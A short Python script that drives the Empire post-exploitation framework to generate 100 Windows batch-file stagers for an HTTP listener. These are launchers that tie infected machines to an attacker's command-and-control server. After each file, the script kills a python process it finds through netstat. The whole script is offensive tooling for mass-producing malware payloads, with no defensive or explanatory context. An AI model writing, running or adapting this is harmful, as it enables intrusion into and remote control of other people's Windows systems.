#!/usr/bin/python3
import os 
import time
for i in range(1,101):
    os.system("sudo /home/dading/Empire/empire -s windows/launcher_bat -o Listener=http -o OutFile=launcher"+str(i)+".bat")
    print("create launcher"+str(i)+".bat successfully")
    time.sleep(2)
    a=os.popen("sudo netstat -antp|grep python")
    PID=a.read().split("/")[0][-5:]
    os.system("sudo kill -9 "+str(PID))
    print("kill "+str(PID))
